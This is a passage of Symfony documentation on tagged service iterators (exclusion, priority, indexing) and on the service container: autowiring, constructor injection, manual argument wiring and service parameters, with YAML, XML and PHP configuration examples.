all services tagged with ``app.handler`` into its constructor argument::

    // src/HandlerCollection.php
    namespace App;

    class HandlerCollection
    {
        public function __construct(iterable $handlers)
        {
        }
    }

Symfony allows you to inject the services using YAML/XML/PHP configuration or
directly via PHP attributes:

.. configuration-block::

    .. code-block:: php-attributes

        // src/HandlerCollection.php
        namespace App;

        use Symfony\Component\DependencyInjection\Attribute\TaggedIterator;

        class HandlerCollection
        {
            public function __construct(
                // the attribute must be applied directly to the argument to autowire
                #[TaggedIterator('app.handler')]
                iterable $handlers
            ) {
            }
        }

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Handler\One:
                tags: ['app.handler']

            App\Handler\Two:
                tags: ['app.handler']

            App\HandlerCollection:
                # inject all services tagged with app.handler as first argument
                arguments:
                    - !tagged_iterator app.handler

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Handler\One">
                    <tag name="app.handler"/>
                </service>

                <service id="App\Handler\Two">
                    <tag name="app.handler"/>
                </service>

                <service id="App\HandlerCollection">
                    <!-- inject all services tagged with app.handler as first argument -->
                    <argument type="tagged_iterator" tag="app.handler"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(App\Handler\One::class)
                ->tag('app.handler')
            ;

            $services->set(App\Handler\Two::class)
                ->tag('app.handler')
            ;

            $services->set(App\HandlerCollection::class)
                // inject all services tagged with app.handler as first argument
                ->args([tagged_iterator('app.handler')])
            ;
        };

.. note::

    Some IDEs will show an error when using ``#[TaggedIterator]`` together
    with the `PHP constructor promotion`_:
    *"Attribute cannot be applied to a property because it does not contain the 'Attribute::TARGET_PROPERTY' flag"*.
    The reason is that those constructor arguments are both parameters and class
    properties. You can safely ignore this error message.

If for some reason you need to exclude one or more services when using a tagged
iterator, add the ``exclude`` option:

.. configuration-block::

    .. code-block:: php-attributes

        // src/HandlerCollection.php
        namespace App;

        use Symfony\Component\DependencyInjection\Attribute\TaggedIterator;

        class HandlerCollection
        {
            public function __construct(
                #[TaggedIterator('app.handler', exclude: ['App\Handler\Three'])]
                iterable $handlers
            ) {
            }
        }

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            # This is the service we want to exclude, even if the 'app.handler' tag is attached
            App\Handler\Three:
                tags: ['app.handler']

            App\HandlerCollection:
                arguments:
                    - !tagged_iterator { tag: app.handler, exclude: ['App\Handler\Three'] }

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <!-- This is the service we want to exclude, even if the 'app.handler' tag is attached -->
                <service id="App\Handler\Three">
                    <tag name="app.handler"/>
                </service>

                <service id="App\HandlerCollection">
                    <!-- inject all services tagged with app.handler as first argument -->
                    <argument type="tagged_iterator" tag="app.handler">
                        <exclude>App\Handler\Three</exclude>
                    </argument>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return function(ContainerConfigurator $containerConfigurator) {
            $services = $containerConfigurator->services();

            // ...

            // This is the service we want to exclude, even if the 'app.handler' tag is attached
            $services->set(App\Handler\Three::class)
                ->tag('app.handler')
            ;

            $services->set(App\HandlerCollection::class)
                // inject all services tagged with app.handler as first argument
                ->args([tagged_iterator('app.handler', exclude: [App\Handler\Three::class])])
            ;
        };

In the case the referencing service is itself tagged with the tag being used in the tagged
iterator, it is automatically excluded from the injected iterable. This behavior can be
disabled by setting the ``exclude_self`` option to ``false``:

.. configuration-block::

    .. code-block:: php-attributes

        // src/HandlerCollection.php
        namespace App;

        use Symfony\Component\DependencyInjection\Attribute\TaggedIterator;

        class HandlerCollection
        {
            public function __construct(
                #[TaggedIterator('app.handler', exclude: ['App\Handler\Three'], excludeSelf: false)]
                iterable $handlers
            ) {
            }
        }

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            # This is the service we want to exclude, even if the 'app.handler' tag is attached
            App\Handler\Three:
                tags: ['app.handler']

            App\HandlerCollection:
                arguments:
                    - !tagged_iterator { tag: app.handler, exclude: ['App\Handler\Three'], exclude_self: false }

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <!-- This is the service we want to exclude, even if the 'app.handler' tag is attached -->
                <service id="App\Handler\Three">
                    <tag name="app.handler"/>
                </service>

                <service id="App\HandlerCollection">
                    <!-- inject all services tagged with app.handler as first argument -->
                    <argument type="tagged_iterator" tag="app.handler" exclude-self="false">
                        <exclude>App\Handler\Three</exclude>
                    </argument>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return function(ContainerConfigurator $containerConfigurator) {
            $services = $containerConfigurator->services();

            // ...

            // This is the service we want to exclude, even if the 'app.handler' tag is attached
            $services->set(App\Handler\Three::class)
                ->tag('app.handler')
            ;

            $services->set(App\HandlerCollection::class)
                // inject all services tagged with app.handler as first argument
                ->args([tagged_iterator('app.handler', exclude: [App\Handler\Three::class], excludeSelf: false)])
            ;
        };

.. seealso::

    See also :doc:`tagged locator services </service_container/service_subscribers_locators>`

Tagged Services with Priority
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The tagged services can be prioritized using the ``priority`` attribute. The
priority is a positive or negative integer that defaults to ``0``. The higher
the number, the earlier the tagged service will be located in the collection:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Handler\One:
                tags:
                    - { name: 'app.handler', priority: 20 }

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Handler\One">
                    <tag name="app.handler" priority="20"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Handler\One;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(One::class)
                ->tag('app.handler', ['priority' => 20])
            ;
        };

Another option, which is particularly useful when using autoconfiguring
tags, is to implement the static ``getDefaultPriority()`` method on the
service itself::

    // src/Handler/One.php
    namespace App\Handler;

    class One
    {
        public static function getDefaultPriority(): int
        {
            return 3;
        }
    }

If you want to have another method defining the priority
(e.g. ``getPriority()`` rather than ``getDefaultPriority()``),
you can define it in the configuration of the collecting service:

.. configuration-block::

    .. code-block:: php-attributes

        // src/HandlerCollection.php
        namespace App;

        use Symfony\Component\DependencyInjection\Attribute\TaggedIterator;

        class HandlerCollection
        {
            public function __construct(
                #[TaggedIterator('app.handler', defaultPriorityMethod: 'getPriority')]
                iterable $handlers
            ) {
            }
        }

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\HandlerCollection:
                # inject all services tagged with app.handler as first argument
                arguments:
                    - !tagged_iterator { tag: app.handler, default_priority_method: getPriority }

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">
            <services>
                <service id="App\HandlerCollection">
                    <argument type="tagged_iterator" tag="app.handler" default-priority-method="getPriority"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use Symfony\Component\DependencyInjection\Argument\TaggedIteratorArgument;

        return function (ContainerConfigurator $container): void {
            $services = $container->services();

            // ...

            $services->set(App\HandlerCollection::class)
                ->args([
                    tagged_iterator('app.handler', null, null, 'getPriority'),
                ])
            ;
        };

Tagged Services with Index
~~~~~~~~~~~~~~~~~~~~~~~~~~

By default, tagged services are indexed using their service IDs. You can change
this behavior with two options of the tagged iterator (``index_by`` and
``default_index_method``) which can be used independently or combined.

The ``index_by`` / ``indexAttribute`` Option
............................................

This option defines the name of the option/attribute that stores the value used
to index the services:

.. configuration-block::

    .. code-block:: php-attributes

        // src/HandlerCollection.php
        namespace App;

        use Symfony\Component\DependencyInjection\Attribute\TaggedIterator;

        class HandlerCollection
        {
            public function __construct(
                #[TaggedIterator('app.handler', indexAttribute: 'key')]
                iterable $handlers
            ) {
            }
        }

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Handler\One:
                tags:
                    - { name: 'app.handler', key: 'handler_one' }

            App\Handler\Two:
                tags:
                    - { name: 'app.handler', key: 'handler_two' }

            App\HandlerCollection:
                arguments: [!tagged_iterator { tag: 'app.handler', index_by: 'key' }]

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Handler\One">
                    <tag name="app.handler" key="handler_one"/>
                </service>

                <service id="App\Handler\Two">
                    <tag name="app.handler" key="handler_two"/>
                </service>

                <service id="App\HandlerCollection">
                    <argument type="tagged_iterator" tag="app.handler" index-by="key"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Handler\One;
        use App\Handler\Two;
        use Symfony\Component\DependencyInjection\Argument\TaggedIteratorArgument;

        return function (ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(One::class)
                ->tag('app.handler', ['key' => 'handler_one']);

            $services->set(Two::class)
                ->tag('app.handler', ['key' => 'handler_two']);

            $services->set(App\HandlerCollection::class)
                ->args([
                    // 2nd argument is the index attribute name
                    tagged_iterator('app.handler', 'key'),
                ])
            ;
        };

In this example, the ``index_by`` option is ``key``. All services define that
option/attribute, so that will be the value used to index the services. For example,
to get the ``App\Handler\Two`` service::

    // src/Handler/HandlerCollection.php
    namespace App\Handler;

    class HandlerCollection
    {
        public function __construct(iterable $handlers)
        {
            $handlers = $handlers instanceof \Traversable ? iterator_to_array($handlers) : $handlers;

            // this value is defined in the `key` option of the service
            $handlerTwo = $handlers['handler_two'];
        }
    }

If some service doesn't define the option/attribute configured in ``index_by``,
Symfony applies this fallback process:

#. If the service class defines a static method called ``getDefault<CamelCase index_by value>Name``
   (in this example, ``getDefaultKeyName()``), call it and use the returned value;
#. Otherwise, fall back to the default behavior and use the service ID.

The ``default_index_method`` Option
...................................

This option defines the name of the service class method that will be called to
get the value used to index the services:

.. configuration-block::

    .. code-block:: php-attributes

        // src/HandlerCollection.php
        namespace App;

        use Symfony\Component\DependencyInjection\Attribute\TaggedIterator;

        class HandlerCollection
        {
            public function __construct(
                #[TaggedIterator('app.handler', defaultIndexMethod: 'getIndex')]
                iterable $handlers
            ) {
            }
        }

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            App\HandlerCollection:
                arguments: [!tagged_iterator { tag: 'app.handler', default_index_method: 'getIndex' }]

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <service id="App\HandlerCollection">
                    <argument type="tagged_iterator"
                        tag="app.handler"
                        default-index-method="getIndex"
                    />
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\HandlerCollection;
        use Symfony\Component\DependencyInjection\Argument\TaggedIteratorArgument;

        return function (ContainerConfigurator $container) {
            $services = $container->services();

            // ...

            $services->set(HandlerCollection::class)
                ->args([
                    tagged_iterator('app.handler', null, 'getIndex'),
                ])
            ;
        };

If some service class doesn't define the method configured in ``default_index_method``,
Symfony will fall back to using the service ID as its index inside the tagged services.

Combining the ``index_by`` and ``default_index_method`` Options
...............................................................

You can combine both options in the same collection of tagged services. Symfony
will process them in the following order:

#. If the service defines the option/attribute configured in ``index_by``, use it;
#. If the service class defines the method configured in ``default_index_method``, use it;
#. Otherwise, fall back to using the service ID as its index inside the tagged services collection.

.. _tags_as-tagged-item:

The ``#[AsTaggedItem]`` attribute
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

It is possible to define both the priority and the index of a tagged
item thanks to the ``#[AsTaggedItem]`` attribute. This attribute must
be used directly on the class of the service you want to configure::

    // src/Handler/One.php
    namespace App\Handler;

    use Symfony\Component\DependencyInjection\Attribute\AsTaggedItem;

    #[AsTaggedItem(index: 'handler_one', priority: 10)]
    class One
    {
        // ...
    }

.. _`PHP constructor promotion`: https://www.php.net/manual/en/language.oop5.decon.php#language.oop5.decon.constructor.promotion
Service Container
=================

.. admonition:: Screencast
    :class: screencast

    Do you prefer video tutorials? Check out the `Symfony Fundamentals screencast series`_.

Your application is *full* of useful objects: a "Mailer" object might help you
send emails while another object might help you save things to the database.
Almost *everything* that your app "does" is actually done by one of these objects.
And each time you install a new bundle, you get access to even more!

In Symfony, these useful objects are called **services** and each service lives
inside a very special object called the **service container**. The container
allows you to centralize the way objects are constructed. It makes your life
easier, promotes a strong architecture and is super fast!

Fetching and using Services
---------------------------

The moment you start a Symfony app, your container *already* contains many services.
These are like *tools*: waiting for you to take advantage of them. In your controller,
you can "ask" for a service from the container by type-hinting an argument with the
service's class or interface name. Want to :doc:`log </logging>` something? No problem::

    // src/Controller/ProductController.php
    namespace App\Controller;

    use Psr\Log\LoggerInterface;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;

    class ProductController extends AbstractController
    {
        #[Route('/products')]
        public function list(LoggerInterface $logger): Response
        {
            $logger->info('Look, I just used a service!');

            // ...
        }
    }

What other services are available? Find out by running:

.. code-block:: terminal

    $ php bin/console debug:autowiring

      # this is just a *small* sample of the output...

      Autowirable Types
      =================

       The following classes & interfaces can be used as type-hints when autowiring:

       Describes a logger instance.
       Psr\Log\LoggerInterface - alias:logger

       Request stack that controls the lifecycle of requests.
       Symfony\Component\HttpFoundation\RequestStack - alias:request_stack

       RouterInterface is the interface that all Router classes must implement.
       Symfony\Component\Routing\RouterInterface - alias:router.default

       [...]

When you use these type-hints in your controller methods or inside your
:ref:`own services <service-container-creating-service>`, Symfony will automatically
pass you the service object matching that type.

Throughout the docs, you'll see how to use the many different services that live
in the container.

.. tip::

    There are actually *many* more services in the container, and each service has
    a unique id in the container, like ``request_stack`` or ``router.default``. For a full
    list, you can run ``php bin/console debug:container``. But most of the time,
    you won't need to worry about this. See :ref:`how to choose a specific service
    <services-wire-specific-service>`. See :doc:`/service_container/debug`.

.. _service-container-creating-service:

Creating/Configuring Services in the Container
----------------------------------------------

You can also organize your *own* code into services. For example, suppose you need
to show your users a random, happy message. If you put this code in your controller,
it can't be re-used. Instead, you decide to create a new class::

    // src/Service/MessageGenerator.php
    namespace App\Service;

    class MessageGenerator
    {
        public function getHappyMessage(): string
        {
            $messages = [
                'You did it! You updated the system! Amazing!',
                'That was one of the coolest updates I\'ve seen all day!',
                'Great work! Keep going!',
            ];

            $index = array_rand($messages);

            return $messages[$index];
        }
    }

Congratulations! You've created your first service class! You can use it immediately
inside your controller::

    // src/Controller/ProductController.php
    use App\Service\MessageGenerator;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;

    class ProductController extends AbstractController
    {
        #[Route('/products/new')]
        public function new(MessageGenerator $messageGenerator): Response
        {
            // thanks to the type-hint, the container will instantiate a
            // new MessageGenerator and pass it to you!
            // ...

            $message = $messageGenerator->getHappyMessage();
            $this->addFlash('success', $message);
            // ...
        }
    }

When you ask for the ``MessageGenerator`` service, the container constructs a new
``MessageGenerator`` object and returns it (see sidebar below). But if you never ask
for the service, it's *never* constructed: saving memory and speed. As a bonus, the
``MessageGenerator`` service is only created *once*: the same instance is returned
each time you ask for it.

.. _service-container-services-load-example:

.. sidebar:: Automatic Service Loading in services.yaml

    The documentation assumes you're using the following service configuration,
    which is the default config for a new project:

    .. configuration-block::

        .. code-block:: yaml

            # config/services.yaml
            services:
                # default configuration for services in *this* file
                _defaults:
                    autowire: true      # Automatically injects dependencies in your services.
                    autoconfigure: true # Automatically registers your services as commands, event subscribers, etc.

                # makes classes in src/ available to be used as services
                # this creates a service per class whose id is the fully-qualified class name
                App\:
                    resource: '../src/'
                    exclude:
                        - '../src/DependencyInjection/'
                        - '../src/Entity/'
                        - '../src/Kernel.php'

                # order is important in this file because service definitions
                # always *replace* previous ones; add your own service configuration below

                # ...

        .. code-block:: xml

            <!-- config/services.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd">

                <services>
                    <!-- Default configuration for services in *this* file -->
                    <defaults autowire="true" autoconfigure="true"/>

                    <!-- makes classes in src/ available to be used as services -->
                    <!-- this creates a service per class whose id is the fully-qualified class name -->
                    <prototype namespace="App\" resource="../src/" exclude="../src/{DependencyInjection,Entity,Kernel.php}"/>

                    <!-- order is important in this file because service definitions
                         always *replace* previous ones; add your own service configuration below -->

                    <!-- ... -->

                </services>
            </container>

        .. code-block:: php

            // config/services.php
            namespace Symfony\Component\DependencyInjection\Loader\Configurator;

            return function(ContainerConfigurator $container): void {
                // default configuration for services in *this* file
                $services = $container->services()
                    ->defaults()
                        ->autowire()      // Automatically injects dependencies in your services.
                        ->autoconfigure() // Automatically registers your services as commands, event subscribers, etc.
                ;

                // makes classes in src/ available to be used as services
                // this creates a service per class whose id is the fully-qualified class name
                $services->load('App\\', '../src/')
                    ->exclude('../src/{DependencyInjection,Entity,Kernel.php}');

                // order is important in this file because service definitions
                // always *replace* previous ones; add your own service configuration below
            };

    .. tip::

        The value of the ``resource`` and ``exclude`` options can be any valid
        `glob pattern`_. The value of the ``exclude`` option can also be an
        array of glob patterns.

    Thanks to this configuration, you can automatically use any classes from the
    ``src/`` directory as a service, without needing to manually configure
    it. Later, you'll learn how to :ref:`import many services at once
    <service-psr4-loader>` with resource.

    If you'd prefer to manually wire your service, you can
    :ref:`use explicit configuration <services-explicitly-configure-wire-services>`.

.. _service-container_limiting-to-env:

Limiting Services to a specific Symfony Environment
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

You can use the ``#[When]`` attribute to only register the class
as a service in some environments::

    use Symfony\Component\DependencyInjection\Attribute\When;

    // SomeClass is only registered in the "dev" environment

    #[When(env: 'dev')]
    class SomeClass
    {
        // ...
    }

    // you can also apply more than one When attribute to the same class

    #[When(env: 'dev')]
    #[When(env: 'test')]
    class AnotherClass
    {
        // ...
    }

.. _services-constructor-injection:

Injecting Services/Config into a Service
----------------------------------------

What if you need to access the ``logger`` service from within ``MessageGenerator``?
No problem! Create a ``__construct()`` method with a ``$logger`` argument that has
the ``LoggerInterface`` type-hint. Set this on a new ``$logger`` property
and use it later::

    // src/Service/MessageGenerator.php
    namespace App\Service;

    use Psr\Log\LoggerInterface;

    class MessageGenerator
    {
        public function __construct(
            private LoggerInterface $logger,
        ) {
        }

        public function getHappyMessage(): string
        {
            $this->logger->info('About to find a happy message!');
            // ...
        }
    }

That's it! The container will *automatically* know to pass the ``logger`` service
when instantiating the ``MessageGenerator``. How does it know to do this?
:ref:`Autowiring <services-autowire>`. The key is the ``LoggerInterface``
type-hint in your ``__construct()`` method and the ``autowire: true`` config in
``services.yaml``. When you type-hint an argument, the container will automatically
find the matching service. If it can't, you'll see a clear exception with a helpful
suggestion.

By the way, this method of adding dependencies to your ``__construct()`` method is
called *dependency injection*.

.. _services-debug-container-types:

How should you know to use ``LoggerInterface`` for the type-hint? You can either
read the docs for whatever feature you're using, or get a list of autowireable
type-hints by running:

.. code-block:: terminal

    $ php bin/console debug:autowiring

      # this is just a *small* sample of the output...

      Describes a logger instance.
      Psr\Log\LoggerInterface - alias:monolog.logger

      Request stack that controls the lifecycle of requests.
      Symfony\Component\HttpFoundation\RequestStack - alias:request_stack

      RouterInterface is the interface that all Router classes must implement.
      Symfony\Component\Routing\RouterInterface - alias:router.default

      [...]

Handling Multiple Services
~~~~~~~~~~~~~~~~~~~~~~~~~~

Suppose you also want to email a site administrator each time a site update is
made. To do that, you create a new class::

    // src/Service/SiteUpdateManager.php
    namespace App\Service;

    use App\Service\MessageGenerator;
    use Symfony\Component\Mailer\MailerInterface;
    use Symfony\Component\Mime\Email;

    class SiteUpdateManager
    {
        public function __construct(
            private MessageGenerator $messageGenerator,
            private MailerInterface $mailer,
        ) {
        }

        public function notifyOfSiteUpdate(): bool
        {
            $happyMessage = $this->messageGenerator->getHappyMessage();

            $email = (new Email())
                ->from('admin@example.com')
                ->to('manager@example.com')
                ->subject('Site update just happened!')
                ->text('Someone just updated the site. We told them: '.$happyMessage);

            $this->mailer->send($email);

            // ...

            return true;
        }
    }

This needs the ``MessageGenerator`` *and* the ``Mailer`` service. That's no
problem, we ask them by type hinting their class and interface names!
Now, this new service is ready to be used. In a controller, for example,
you can type-hint the new ``SiteUpdateManager`` class and use it::

    // src/Controller/SiteController.php
    namespace App\Controller;

    use App\Service\SiteUpdateManager;
    // ...

    class SiteController extends AbstractController
    {
        public function new(SiteUpdateManager $siteUpdateManager): Response
        {
            // ...

            if ($siteUpdateManager->notifyOfSiteUpdate()) {
                $this->addFlash('success', 'Notification mail was sent successfully.');
            }

            // ...
        }
    }

Thanks to autowiring and your type-hints in ``__construct()``, the container creates
the ``SiteUpdateManager`` object and passes it the correct argument. In most cases,
this works perfectly.

.. _services-manually-wire-args:

Manually Wiring Arguments
~~~~~~~~~~~~~~~~~~~~~~~~~

But there are a few cases when an argument to a service cannot be autowired. For
example, suppose you want to make the admin email configurable:

.. code-block:: diff

      // src/Service/SiteUpdateManager.php
      // ...

      class SiteUpdateManager
      {
          // ...
    +    private string $adminEmail;

          public function __construct(
              private MessageGenerator $messageGenerator,
              private MailerInterface $mailer,
    +        private string $adminEmail
          ) {
          }

          public function notifyOfSiteUpdate(): bool
          {
              // ...

              $email = (new Email())
                  // ...
    -            ->to('manager@example.com')
    +            ->to($this->adminEmail)
                  // ...
              ;
              // ...
          }
      }

If you make this change and refresh, you'll see an error:

    Cannot autowire service "App\\Service\\SiteUpdateManager": argument "$adminEmail"
    of method "__construct()" must have a type-hint or be given a value explicitly.

That makes sense! There is no way that the container knows what value you want to
pass here. No problem! In your configuration, you can explicitly set this argument:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ... same as before

            # same as before
            App\:
                resource: '../src/'
                exclude: '../src/{DependencyInjection,Entity,Kernel.php}'

            # explicitly configure the service
            App\Service\SiteUpdateManager:
                arguments:
                    $adminEmail: 'manager@example.com'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ...  same as before -->

                <!-- Same as before -->

                <prototype namespace="App\"
                    resource="../src/"
                    exclude="../src/{DependencyInjection,Entity,Kernel.php}"
                />

                <!-- Explicitly configure the service -->
                <service id="App\Service\SiteUpdateManager">
                    <argument key="$adminEmail">manager@example.com</argument>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Service\SiteUpdateManager;

        return function(ContainerConfigurator $container): void {
            // ...

            // same as before
            $services->load('App\\', '../src/')
                ->exclude('../src/{DependencyInjection,Entity,Kernel.php}');

            $services->set(SiteUpdateManager::class)
                ->arg('$adminEmail', 'manager@example.com')
            ;
        };

Thanks to this, the container will pass ``manager@example.com`` to the ``$adminEmail``
argument of ``__construct`` when creating the ``SiteUpdateManager`` service. The
other arguments will still be autowired.

But, isn't this fragile? Fortunately, no! If you rename the ``$adminEmail`` argument
to something else - e.g. ``$mainEmail`` - you will get a clear exception when you
reload the next page (even if that page doesn't use this service).

.. _service-container-parameters:

Service Parameters
------------------

In addition to holding service objects, the container also holds configuration,
called **parameters**. The main article about Symfony configuration explains the
:ref:`configuration parameters <configuration-parameters>` in detail and shows
all their types (string, boolean, array, binary and PHP constant parameters).

However, there is another type of parameter related to services. In YAML config,
any string which starts with ``@`` is considered as the ID of a service, instead
of a regular string. In XML config, use the ``type="service"`` type for the
parameter and in PHP config use the ``service()`` function:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Service\MessageGenerator:
                arguments:
                    # this is not a string, but a reference to a service called 'logger'
                    - '@logger'

                    # if the value of a string argument starts with '@', you need to escape
                    # it by adding another '@' so Symfony doesn't consider it a service
                    # the following example would be parsed as the string '@securepassword'
                    # - '@@securepassword'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Service\MessageGenerator">
                    <argument type="service" id="logger"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Service\MessageGenerator;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(MessageGenerator::class)
                ->args([service('logger')])
            ;
        };

Working with container parameters is straightforward using the container's
accessor methods for parameters::

    // checks if a parameter is defined (parameter names are case-sensitive)
    $container->hasParameter('mailer.transport');

    // gets value of a parameter
    $container->getParameter('mailer.transport');

    // adds a new parameter
    $container->setParameter('mailer.transport', 'sendmail');

.. caution::

    The used ``.`` notation is a
    :ref:`Symfony convention <service-naming-conventions>` to make parameters
    easier to read. Parameters are flat key-value elements, they can't
    be organized into a nested array

.. note::

    You can only set a parameter before the container is compiled, not at run-time.
    To learn more about compiling the container see
    :doc:`/components/dependency_injection/compilation`.

.. _services-wire-specific-service:

Choose a Specific Service
-------------------------

The ``MessageGenerator`` service created earlier requires a ``LoggerInterface`` argument::

    // src/Service/MessageGenerator.php
    namespace App\Service;

    use Psr\Log\LoggerInterface;

    class MessageGenerator
    {
        public function __construct(
            private LoggerInterface $logger,
        ) {
        }
        // ...
    }

However, there are *multiple* services in the container that implement ``LoggerInterface``,
such as ``logger``, ``monolog.logger.request``, ``monolog.logger.php``, etc. How
does the container know which one to use?

In these situations, the container is usually configured to automatically choose
one of the services - ``logger`` in this case (read more about why in :ref:`service-autowiring-alias`).
But, you can control this and pass in a different logger:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ... same code as before

            # explicitly configure the service
            App\Service\MessageGenerator:
                arguments:
                    # the '@' symbol is important: that's what tells the container
                    # you want to pass the *service* whose id is 'monolog.logger.request',
                    # and not just the *string* 'monolog.logger.request'
                    $logger: '@monolog.logger.request'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... same code as before -->

                <!-- Explicitly configure the service -->
                <service id="App\Service\MessageGenerator">
                    <argument key="$logger" type="service" id="monolog.logger.request"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Service\MessageGenerator;

        return function(ContainerConfigurator $container): void {
            // ... same code as before

            // explicitly configure the service
            $services->set(MessageGenerator::class)
                ->arg('$logger', service('monolog.logger.request'))
            ;
        };

This tells the container that the ``$logger`` argument to ``__construct`` should use
service whose id is ``monolog.logger.request``.

For a list of possible logger services that can be used with autowiring, run:

.. code-block:: terminal

    $ php bin/console debug:autowiring logger

.. _container-debug-container:

For a full list of *all* possible services in the container, run:

.. code-block:: terminal

    $ php bin/console debug:container

Remove Services
---------------

A service can be removed from the service container if needed. This is useful
for example to make a service unavailable in some :ref:`configuration environment <configuration-environments>`
(e.g. in the ``test`` environment):

.. configuration-block::

    .. code-block:: php

        // config/services_test.php
